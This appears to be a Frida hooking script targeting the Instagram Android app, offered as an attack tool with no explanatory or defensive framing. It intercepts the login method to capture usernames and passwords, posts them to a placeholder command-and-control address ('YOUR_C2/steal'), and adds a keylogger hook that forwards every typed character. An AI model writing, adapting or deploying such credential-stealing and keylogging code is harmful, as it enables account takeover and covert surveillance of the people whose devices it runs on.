Java.perform(function() {
    // Hook Instagram login
    var LoginActivity = Java.use("com.instagram.android.login.LoginActivity");
    LoginActivity.onLogin.implementation = function(username, password) {
        console.log("[+] Instagram credentials: " + username + ":" + password);
        
        // Exfiltrate
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://YOUR_C2/steal");
        xhr.send(JSON.stringify({user: username, pass: password}));
        
        return this.onLogin(username, password);
    };
    
    // Keylogger
    var KeyEvent = Java.use("android.view.KeyEvent");
    KeyEvent.getUnicodeChar.implementation = function() {
        var char = this.getUnicodeChar();
        if (char) send("KEY: " + String.fromCharCode(char));
        return char;
    };
});